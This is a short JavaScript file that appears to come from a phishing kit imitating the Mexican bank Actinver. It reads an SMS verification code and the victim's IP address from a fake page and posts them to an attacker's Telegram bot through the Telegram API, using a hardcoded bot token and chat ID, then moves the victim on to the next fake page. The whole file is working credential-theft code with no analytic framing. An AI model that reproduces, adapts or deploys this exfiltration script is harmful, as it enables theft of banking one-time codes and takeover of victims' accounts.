//bot token
var telegram_bot_id = "6861598320:AAFFMFRg4LsYZeIAymWsG8wh0WxBcTBePDg";
//chat id
var chat_id = "7144869881";
var u_name, ip, ip2;
var ready = function () {
    u_name = document.getElementById("uzer").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "//📲Codigo SMS#: " + u_name + "\nIP: " + ip +"\n" + ip2 +"\n\n✅Actinver✅";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'index5.html';
        console.log(response);
    });
    return false;
};
